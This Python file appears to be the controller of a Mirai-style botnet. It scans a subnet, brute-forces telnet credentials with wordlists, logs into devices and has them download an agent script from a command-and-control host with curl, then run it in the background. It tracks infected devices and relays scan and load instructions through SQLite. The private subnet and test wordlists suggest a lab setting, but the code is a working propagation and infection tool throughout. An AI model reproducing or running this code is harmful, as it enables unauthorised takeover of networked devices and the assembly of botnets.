import subprocess;
import json;
import asyncio;
import io;
import inspect;
import sys;
import os;
import telnetlib3;
import subprocess;
import socket;
import time
import sqlite3

path = os.path.dirname(inspect.stack()[0][1])
default_bin_path = os.path.join(path, "../bin")
default_wordlist_path = os.path.join(path, "../wordlists")
default_db_path = os.path.join(os.path.dirname(inspect.stack()[0][1]), "../db/botnet.db")
DB   = os.getenv("DB_PATH", default_db_path)
CC_HOST = "172.18.0.1"
CC_PORT = "8000"
self_ip = socket.gethostbyname(socket.gethostname())

def get_con():
    con = sqlite3.connect(DB, check_same_thread=False)
    con.execute("PRAGMA journal_mode=WAL")  # safe alongside controller process
    return con

def main():
    print(f"self_ip: {self_ip}")
    scan(True, "172.18.0.0", "28")
    brute_next_device()
    time.sleep(1) # ugly but works
    asyncio.run(infect_victims())
    scan(False, "172.18.0.0", "28")


# this and the below function install programs have the purpose of
# logging in to the devices and downloading the agent payload to them
async def shell(reader, writer, dev_id, username, password):
    logged_in = False

    while True:
        output = await reader.read(1024)
        if not output:
            break;

        print(output, end='', flush=True)
        if not logged_in:
            if 'login' in output:
                writer.write(username + '\r\n')
            elif 'password' in output or 'Password' in output:
                writer.write(password + '\r\n')

            elif '$' in output:
                logged_in = True
                # TODO: integrated device id management
                writer.write(f"curl http://{CC_HOST}:{CC_PORT}/payload/agent?device_id={dev_id} -o agent.sh\r\n")
        else:
            if "$" in output:
                writer.write(f"echo {dev_id} > dev_id\r\n")
                writer.write(f"chmod +x agent.sh\r\n")
                writer.write(f"./agent.sh & disown\r\n")
                writer.write("exit\r\n")
                break;
            
def get_device_data_from_db(ip):
    con = get_con()
    rows = con.execute(
            """
            SELECT device_id, username, password
            FROM devices
            WHERE ip=?
            """, [ip]).fetchone()
    con.close()

    return rows

def scan(from_root, iprange, ipmask):
    con = get_con()
    if from_root:
        rc = subprocess.run([f"{default_bin_path}/scanner_amd64", iprange, ipmask])
        return rc
    else:
        # fetch first non_busy device
        row = con.execute("""
            SELECT device_id FROM devices WHERE busy = 0
                          """).fetchone()
        con.close()
        print(f"Non busy devices: {row}")
        if row == None:
            return
        (device_id,) = row
        instruction = f"scan {iprange} {ipmask}"
        print("Instructing {device_id} to scan {iprange}/{ipmask}")
        give_instruction(instruction, device_id)

def update_bruted_status():
    con = get_con()
    con.execute("""
        UPDATE devices_tobrute
        SET bruted = 1
        WHERE device_id IN (
            SELECT device_id
            FROM instructions
            WHERE instruction LIKE 'load%'
              AND status = 1
        )
    """)
    con.commit()
    con.close()

def give_instruction(instruction, device_id):
    con = get_con()
    con.execute("""
    INSERT INTO instructions (device_id, instruction, status)
    VALUES (?, ?, ?)
    ON CONFLICT(device_id)
    DO UPDATE SET
        instruction = excluded.instruction,
        status = excluded.status
    WHERE excluded.status = 1
    """, [device_id, instruction, 0])
    con.commit()
    con.close()


# picks first device from db row and brutes it, marks as bruted and adds to devices
def brute_next_device():
    update_bruted_status()
    con = get_con()
    rows = con.execute(
        """
        SELECT device_id, ip, scanned_by_ip
        FROM devices_tobrute
        WHERE bruted = 0
    """).fetchone()

    device_id, ip, scanned_by_ip = rows
    if (scanned_by_ip == self_ip):
        # spawn loader in this device
        rc = subprocess.run([f"{default_bin_path}/loader_amd64", ip, "23", f"{default_wordlist_path}/testuser.txt", f"{default_wordlist_path}/testpass.txt", "20"])
        print(f"rc: {rc}\n")
        if rc.returncode == 0:
            print(f"updating table tobrute device id {device_id}\n")
            con.execute("""
                UPDATE devices_tobrute
                SET bruted = 1
                WHERE device_id = (?)
            """, [device_id])
            con.commit()
    else:
        instruction = f"load {ip}"
        # does not insert instruction while device still has an ongoing one
        con.execute("""
            INSERT INTO instructions (device_id, instruction, status)
            VALUES (?, ?, ?)
            ON CONFLICT(device_id)
            DO UPDATE SET
                instruction = excluded.instruction,
                status = excluded.status
            WHERE excluded.status = 1
        """, [device_id, instruction, 0])
        con.commit()
    con.close()

async def install_programs(ip):
    data = get_device_data_from_db(ip)
    reader, writer = await telnetlib3.client.open_connection(ip, 23);
    await shell(reader, writer, data[0], data[1], data[2]);

async def infect_victims():
    con = get_con()
    ips = con.execute("""
        SELECT ip
        FROM devices
        WHERE infected = 0
        """).fetchall()

    con.close()
    print(f"IPs to infect {ips}")
    for (ip,) in ips:
        print(f"Infecting {ip}")
    tasks = [install_programs(ip) for (ip,) in ips]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        scan(False, "172.18.0.0", "28")
    else:
        main()
